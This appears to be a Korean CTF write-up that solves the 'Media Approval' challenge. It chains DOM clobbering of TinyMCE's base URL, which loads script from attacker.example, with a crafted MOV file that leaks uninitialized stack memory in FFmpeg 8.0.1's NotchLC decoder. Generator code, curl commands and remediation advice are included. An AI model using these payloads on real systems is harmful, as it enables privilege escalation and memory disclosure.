---
title: "[2026 UHCON CTF] Media Approval"
date: 2026-10-31 11:37:42 +0900
categories: [CTF/Wargame]
tags: [ctf, web, dom-clobbering, ffmpeg, memory-leak]
---

# Media Approval - DOM Clobbering과 FFmpeg 디코더를 연결한 플래그 유출

## 1. 문제 정보

- 문제명: **Media Approval**
- 설명: 공연 영상 납품 사이트의 소스 코드를 분석해 플래그를 획득하는 문제
- 타겟:
  - `http://43.203.139.141:8000`
  - `http://3.38.217.83:8000`
- 소스: [`work_media_approval`](work_media_approval/)

최종 플래그:

```text
FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}
```

## 2. 전체 공격 흐름

공격은 두 단계로 나뉘다.

1. 납품 노트의 DOM clobbering으로 TinyMCE의 스크립트 기준 URL을 외부 주소로 변경한다.
2. 매니저 검토 봇에서 외부 JavaScript를 실행해 프리뷰 요청을 승인하고 `associate_screens_producer` 권한을 얻는다.
3. 버전 비교 기능이 승인본과 공격자 MOV를 같은 스레드에서 순서대로 디코딩하는 점을 이용한다.
4. FFmpeg 8.0.1 NotchLC LZ4 디코더의 초기화되지 않은 스택 히스토리에서 이전 디코딩의 플래그를 읽는다.
5. 유출된 바이트가 Y 평면으로 디코딩되도록 조작한 후 `/compare/still`의 PNG를 다시 바이트로 변환한다.

## 3. 플래그가 저장되는 위치

[`mediaops.py`](work_media_approval/mediaops.py)의 `approved_version()`은 `FLAG` 환경 변수를 승인본 MOV 파일에 직접 삽입한다.

```python
content = start + 3 + 300
available = bytes(blob[content:start + 3 + size])
stop = available.find(b'}')
value = flag.encode('ascii')
blob[content:content + stop + 1] = value + bytes(stop + 1 - len(value))
```

`show/current.mov`의 첫 프레임은 NotchLC이며, 압축 해제 크기는 380바이트다. 실제 플래그는 이 압축 해제 데이터의 오프셋 300에 들어간다.

원본 LZ4 스트림은 `f0 ff 6e` 뒤의 380바이트 전부를 literal로 복사한다.

```text
literal length = 15 + 255 + 110 = 380
flag location  = LZ4 history[300:352]
```

## 4. 1단계: DOM clobbering으로 제작 담당자 권한 획득

### 4.1 기본 권한

회원가입 직후의 사용자는 다음 상태다.

```text
role     = delivery_contact
previews = Blocked
```

`/compare` 등의 제작·기술 검수 기능을 쓰려면 매니저가 `preview` 요청을 승인해야 한다. [`requests.py`](work_media_approval/requests.py)의 승인 로직은 다음과 같다.

```python
if decision == 'approve' and item['kind'] == 'preview':
    db.execute(
        'UPDATE users SET role=?,previews=? WHERE id=? AND show_id=?',
        ('associate_screens_producer', 'Allowed', item['owner'], ctx.user['show_id'])
    )
```

### 4.2 검토 봇

[`reviewer_bot.py`](work_media_approval/reviewer_bot.py)는 납품자가 등록한 `location`을 먼저 방문한 뒤, 요청에 한정된 매니저 세션으로 `/manager?request=...`를 연다. 이후 답변 textarea에 focus를 주어 TinyMCE를 로드한다.

### 4.3 노트의 재파싱

[`static/js/app.js`](work_media_approval/static/js/app.js)는 서버가 HTML escape한 노트를 `textContent`로 다시 꺼낸 후 Sanitizer API로 HTML로 재파싱한다.

```javascript
const sanitizer = new Sanitizer({
  elements: ['a','p','br','strong','em','ul','ol','li','span']
});
notes.forEach(note => {
  const source = note.textContent;
  note.setHTML(source, {sanitizer});
});
```

`script`, 이벤트 핸들러 등은 제거되지만 `id`, `name`, `href`가 남는다. 따라서 전형적인 `<script>` XSS 대신 DOM clobbering이 가능하다.

### 4.4 TinyMCE 기준 URL 클로버링

textarea가 focus되면 다음 코드가 실행된다.

```javascript
script.src = '/tinymce/tinymce.min.js';
// ...
window.tinymce.init({
  selector: 'textarea[data-reply]',
  plugins: 'lists link'
});
```

TinyMCE는 초기화 중 기존 `window.tinymce` 값을 pre-initialization 설정으로 참조하고, 그 객체의 `base` 또는 `baseURL`을 테마·아이콘·플러그인 로딩 주소로 사용한다.

다음 페이로드를 납품 노트에 넣었다.

```html
<a id="tinymce">x</a>
<a id="tinymce" name="base"
   href="https://attacker.example/?x=">y</a>
```

동일한 `id="tinymce"`가 두 개 생기면 `window.tinymce`는 `HTMLCollection`으로 클로버링된다. 두 번째 anchor의 `name="base"`때문에 `window.tinymce.base`는 공격자 URL을 가리킨다.

페이지의 CSP는 nonce와 `'strict-dynamic'`을 사용한다. nonce를 가진 `app.js`가 TinyMCE 본체를 생성했고, 그 TinyMCE가 다시 생성한 외부 스크립트에도 신뢰가 전파된다. 그 결과 외부 호스트의 JavaScript가 CSP를 통과해 실행된다.

외부 서버는 TinyMCE가 요청하는 모든 경로에 `application/javascript`로 다음 내용을 반환하도록 구성했다.

```javascript
document.querySelector('button[value="approve"]').click();
```

요청 종류를 `preview`로 선택한 뒤 납품을 검토 큐에 넣으면, 검토 봇이 위 JavaScript를 실행해 승인 버튼을 눌렀다. 이후 계정의 역할은 다음과 같이 변경되었다.

```text
role     = associate_screens_producer
previews = Allowed
```

## 5. 2단계: NotchLC 미초기화 스택 유출

### 5.1 비교 작업의 디코딩 순서

[`mediaops.py`](work_media_approval/mediaops.py)의 `_compare()`는 승인본을 먼저 디코딩하고, 즉시 사용자가 업로드한 파일을 디코딩한다.

```python
first = video_frame(approved_version())
second = video_frame(own_path)
```

작업은 `ThreadPoolExecutor(max_workers=1)` 내에서 실행되므로 두 디코딩의 호출 경로와 스레드가 같다.

또한 `video_frame()`은 다음 코덱만 허용한다.

```python
DELIVERY_CODECS = ('notchlc', 'prores', 'hap')
```

### 5.2 FFmpeg 8.0.1 NotchLC 디코더

[`Dockerfile`](work_media_approval/Dockerfile)을 보면 서버는 FFmpeg 8.0.1을 소스에서 빌드한다.

FFmpeg 8.0.1의 [`libavcodec/notchlc.c`](https://github.com/FFmpeg/FFmpeg/blob/n8.0.1/libavcodec/notchlc.c) LZ4 디코더에는 다음과 같은 64KB 지역 배열이 존재한다.

```c
uint8_t history[64 * 1024];
```

이 배열은 0으로 초기화되지 않는다. 그런데 match 역참조 계산은 아직 literal이나 match로 작성하지 않은 앞부분을 참조하는 것을 차단하지 않는다.

```c
reference_pos = (pos >= delta)
              ? pos - delta
              : 65536 + pos - delta;
```

따라서 첫 번째 NotchLC 디코딩이 스택의 `history` 배열에 플래그를 남긴 뒤, 두 번째 디코딩에서 아직 쓰지 않은 과거 `history` 영역을 match로 읽을 수 있다.

### 5.3 LZ4 역참조 계산

승인본 디코딩 후 스택은 다음과 같은 상태다.

```text
stale history[300:352] = 52-byte flag field
```

공격자 프레임은 처음 252바이트를 literal로 출력한 뒤 match를 시작한다. 이때 `history[300]`을 가리키는 delta는 다음과 같다.

```text
pos       = 252
target    = 300
delta     = 65536 + pos - target
          = 65536 + 252 - 300
          = 65488
          = 0xffd0
```

match 길이를 52로 설정하면 스택에 남아 있던 플래그가 새 압축 해제 버퍼의 `[252:304]`로 복사된다.

### 5.4 플래그를 Y 평면에 배치

원본 NotchLC 헤더의 주요 값은 다음과 같다.

```text
uncompressed size = 380
y_data_size       = 128
y_data_offset     = data_end - y_data_size
                  = 380 - 128
                  = 252
```

즉, 역참조로 복사한 플래그의 시작 위치 252는 정확히 Y 데이터의 시작이다.

원본의 Y row offset은 마지막 행 그룹이 다시 0을 가리키므로, 이를 다음과 같이 바꾼었다.

```text
[0, 32, 64, 96]
```

이렇게 하면 128바이트의 Y 데이터가 순서대로 모두 화면에 디코딩된다.

### 5.5 악성 MOV 생성

다음은 실제로 사용한 핵심 생성 코드다.

```python
#!/usr/bin/env python3
import struct
from pathlib import Path

source = Path('show/current.mov').read_bytes()

# NotchLC metadata up to the Y bitstream.
prefix = bytearray(source[47:47 + 252])

# Fourth 4-row group reads y_data[96:128].
struct.pack_into('<I', prefix, 52, 96)

# Sequence 1:
#   token ff
#   literal extension ed: 15 + 237 = 252 bytes
#   delta d0 ff: stale history[300]
#   match extension 21: 4 + 15 + 33 = 52 bytes
# Sequence 2:
#   token f0, literal extension 3d: 15 + 61 = 76 zero bytes
compressed = (
    b'\xff\xed' + prefix +
    struct.pack('<H', 0xffd0) + b'\x21' +
    b'\xf0\x3d' + bytes(76)
)
assert len(compressed) == 335

packet = b'1CLN' + struct.pack('<III', 380, len(compressed), 1) + compressed
assert len(packet) == 351

# Reuse the original MOV metadata and update the sample size.
moov = bytearray(source[427:])
stsz = moov.index(b'stsz')
struct.pack_into('>I', moov, stsz + 16, len(packet))

mdat = struct.pack('>I4s', len(packet) + 8, b'mdat') + packet
result = source[:20] + mdat + moov
Path('leak.mov').write_bytes(result)
```

생성된 `leak.mov`의 크기는 970바이트이며, 코덱과 크기는 다음과 같이 인식된다.

```text
codec_name = notchlc
width      = 16
height     = 16
```

## 6. 서버에서 플래그 복원

### 6.1 비교 작업 실행

1단계에서 얻은 제작 담당자 계정으로 `leak.mov`를 납품한다. 이후 `/compare`에서 해당 납품본을 선택하면 서버는 다음 순서로 처리한다.

```text
1. approved_version() creates the flag-bearing MOV
2. decode approved MOV -> flag remains in NotchLC LZ4 stack history
3. decode leak.mov     -> stale flag copied into the attacker's Y plane
4. write_still()       -> leaked Y plane saved as a 16-bit PNG
```

실제 요청은 대략 다음과 같다.

```bash
curl -b cookies \
  -F 'name=notch_stack_leak' \
  -F 'version=v001' \
  -F 'media=@leak.mov;filename=leak.mov;type=video/quicktime' \
  http://TARGET/deliveries/new

curl -b cookies -d 'delivery=DELIVERY_ID' http://TARGET/compare
curl -b cookies -o leak.png 'http://TARGET/compare/still?id=REPORT_ID'
```

### 6.2 PNG에서 바이트 복원

NotchLC Y control word는 4비트 픽셀을 사용하며 `y_min=0`, `y_max=4095`로 구성했다. 따라서 각 nibble `n`은 PNG에서 대략 `n * 0x1111`의 16비트 그레이스케일 값이 된다.

픽셀 순서는 일반적인 행 우선이 아니라 NotchLC의 4x4 블록 순서에 맞춰야 한다. `BITSTREAM_READER_LE`이므로 첫 nibble이 바이트의 하위 4비트다.

```python
from PIL import Image

image = Image.open('leak.png')
pixels = list(image.getdata())

nibbles = []
for y_group in range(0, 16, 4):
    for x_group in range(0, 16, 4):
        for y in range(y_group, y_group + 4):
            for x in range(x_group, x_group + 4):
                value = pixels[y * 16 + x]
                nibbles.append(round(value / 0x1111))

data = bytes(
    nibbles[i] | (nibbles[i + 1] << 4)
    for i in range(0, len(nibbles), 2)
)

print(data.split(b'\0', 1)[0].decode())
```

출력:

```text
FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}
```

## 7. 실패한 접근과 원인

### DASH 매니페스트 LFI

로컬의 일반 FFmpeg 빌드에서는 DASH `BaseURL`로 `/data/show-current.mov`를 열 수 있었다. 하지만 서버의 [`Dockerfile`](work_media_approval/Dockerfile)은 `--disable-autodetect`를 사용하면서 libxml2를 활성화하지 않았다. 그 결과 서버 FFmpeg에는 DASH demuxer가 포함되지 않았다.

### HLS 매니페스트

HLS probe는 파일명이 `.m3u8`/`.m3u`이거나 적절한 MIME type이어야 한다. 업로드된 파일은 서버에서 랜덤한 `.mov` 파일명으로 저장되므로 HLS로 탐지되지 않았다.

### concat demuxer

`ffconcat version 1.0`은 `.mov` 확장자에서도 자동 탐지되지만 safe mode가 기본으로 활성화된다. 업로드 경로 `/data/files/<random>.mov`에서 `/data/show-current.mov`로 가려면 `../show-current.mov`이 필요한데, `..` 경로는 safe mode에서 차단된다.

결국 이 문제의 의도에 맞는 누출 경로는 파일 LFI가 아니라, **연속된 NotchLC 디코딩 사이의 미초기화 스택 재사용**이었다.

## 8. 보안 개선 방법

### 웹 애플리케이션

- 이미 escape한 노트를 `textContent -> setHTML()`로 재파싱하지 않는다.
- HTML이 필요하다면 `id`, `name`, `href` 허용 규칙을 명시적으로 제한하고 중복 ID를 제거한다.
- TinyMCE의 `base_url`을 애플리케이션이 상수로 설정하고 DOM global을 pre-init 설정으로 사용하지 않도록 한다.
- `'strict-dynamic'`으로 신뢰가 전파되는 경로를 검토하고, 필요하다면 Trusted Types를 추가한다.
- 봇이 사용자 제공 URL을 방문해야 한다면 외부 오리진과 내부 검토 오리진을 서로 다른 브라우저 컨텍스트로 분리한다.

### 미디어 디코더

- FFmpeg NotchLC LZ4 `history` 배열을 0으로 초기화한다.
- match가 아직 작성되지 않은 히스토리 영역을 참조하지 못하도록 검증한다.
- 보안 수정이 반영된 FFmpeg 버전으로 업데이트한다.
- 승인본과 신뢰할 수 없는 사용자 영상을 같은 워커 스레드에서 순서대로 디코딩하지 않는 것도 defense-in-depth가 된다.

## 9. 결론

이 문제는 단순한 stored XSS나 파일 다운로드 문제가 아니다. 첫 단계에서는 **DOM clobbering + TinyMCE 기준 URL 오염 + CSP trust propagation**으로 제작 담당자 권한을 얻고, 두 번째 단계에서는 **FFmpeg NotchLC LZ4 미초기화 스택 재사용**으로 승인 영상 안의 플래그를 픽셀로 유출하는 체인이었다.

최종 플래그:

```text
FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}
```
